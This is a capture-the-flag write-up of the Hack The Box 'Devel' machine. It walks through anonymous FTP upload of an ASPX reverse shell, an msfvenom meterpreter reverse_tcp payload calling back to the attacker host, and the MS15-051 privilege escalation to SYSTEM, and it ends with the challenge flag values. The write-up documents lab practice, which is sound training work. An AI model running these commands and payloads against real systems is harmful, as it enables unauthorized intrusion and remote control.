# HTB Write-Up: Devel

| Field | Details |
| --- | --- |
| Platform | [Hack The Box](https://app.hackthebox.com/machines/Devel) |
| Difficulty | Easy |
| OS | Windows |
| Date | October 20, 2026 |

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Access — Anonymous FTP to wwwroot & ASPX Webshell](#initial-access-anonymous-ftp-to-wwwroot-aspx-webshell)
3. [Privilege Escalation — Local Exploit Suggester & MS15-051](#privilege-escalation-local-exploit-suggester-ms15-051)

## Reconnaissance

A full service scan was run with **Nmap**:

```bash
nmap -A 10.129.86.189
```

**Open Ports:**

| Port | Service | Details |
| --- | --- | --- |
| 21 | FTP | Microsoft ftpd — anonymous login allowed |
| 80 | HTTP | Microsoft IIS httpd 7.5, title "IIS7" |

Two things stood out immediately: **anonymous FTP login was permitted**, and the FTP directory listing already showed `iisstart.htm` and `welcome.png` — the default files IIS drops in its web root on install. That's a strong hint the FTP home directory and the website's `wwwroot` are the same place.

## Initial Access — Anonymous FTP to wwwroot & ASPX Webshell

### 2.1 — Confirming Anonymous Access

```bash
ftp 10.129.86.189
# Name: anonymous
# Password: (blank)
230 User logged in.
```

```
ftp> ls
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
ftp> prompt
ftp> mget *
```

### 2.2 — Identifying the Web Root

The three items retrieved confirmed the hunch from recon:

- **`iisstart.htm`** — the default IIS welcome page, shown at `http://<ip>/` on a fresh install
- **`welcome.png`** — the IIS7 logo embedded in that page
- **`aspnet_client`** — a system folder ASP.NET creates directly inside `wwwroot`

Seeing these files immediately on login, with no further navigation needed, confirmed the **FTP home directory is directly mapped to `C:\inetpub\wwwroot`** — the site's web root. Anything uploaded over FTP would be instantly reachable and executable over HTTP.

### 2.3 — Uploading a Webshell

A public ASP.NET webshell was used: [borjmz/aspx-reverse-shell](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx), with the IP and port edited to point back to the attacker host, and uploaded over the same FTP session:

```bash
ftp> put shell.aspx
```

A listener was opened and the shell triggered by requesting it over HTTP:

```bash
rlwrap nc -nvlp 4444
```

```
http://10.129.86.189/shell.aspx
```

```
connect to [10.10.14.25] from (UNKNOWN) [10.129.86.189] 49173
Spawn Shell...
c:\windows\system32\inetsrv>whoami
IIS APPPOOL\Web
```

### 2.4 — Checking for a Path Forward

`C:\Users\babis` exists but wasn't accessible from this low-privilege context:

```
C:\Users>cd babis
Access is denied.
```

Checking token privileges showed one worth abusing:

```
C:\Users>whoami /priv
```

```
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

**SeImpersonatePrivilege** is the classic path to SYSTEM via a potato-style exploit, so that became the next target.

## Privilege Escalation — Local Exploit Suggester & MS15-051

### 3.1 — Why Potato Exploits Failed

With **SeImpersonatePrivilege** enabled, the usual move is a potato-family exploit (PrintSpoofer, GodPotato, etc.). None of them worked here — those tools target modern **64-bit** Windows, while this box is **Windows 7 32-bit (x86)**, a build they don't support. That ruled out the standard path and called for an older, architecture-matched exploit instead — found via Metasploit's local exploit suggester.

### 3.2 — Staging a Meterpreter Payload via FTP

A meterpreter payload was generated and uploaded the same way as the first webshell:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f aspx > devel.aspx
```

```
ftp> del shell.aspx
ftp> put devel.aspx
```

A multi/handler caught the callback:

```
msfconsole -q
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.14.25
set lport 4444
set ExitOnSession false
exploit -j
```

```
[*] Meterpreter session 1 opened (10.10.14.25:4444 -> 10.129.86.201:49163)
```

```
sessions
  1  meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL
```

### 3.3 — Local Exploit Suggester

```bash
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Several candidates came back as likely vulnerable, including `bypassuac_comhijack`, `cve_2020_0787_bits_arbitrary_file_move`, `ms10_015_kitrap0d`, and `ms16_075_reflection`. **`ms15_051_client_copy_image`** was picked — flagged as a direct vulnerability match ("Revision 16385 appears vulnerable") rather than just an unconfirmed service check, giving it the best odds.

### 3.4 — Exploiting MS15-051

```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION 1
set LHOST 10.10.14.25
set LPORT 4443
run
```

**Output:**

```
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching msiexec to host the DLL...
[*] Sending stage (199238 bytes) to 10.129.86.201
[*] Meterpreter session 2 opened (10.10.14.25:4443 -> 10.129.86.201:49164)
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 3.5 — User & Root Flags

```
meterpreter > shell
C:\Users\babis>type Desktop\user.txt
7fcd5948a5d8b5d2045253790bc40093

C:\Users\Administrator\Desktop>type root.txt
93cd81a4c6629374be39745df58de8b6
```
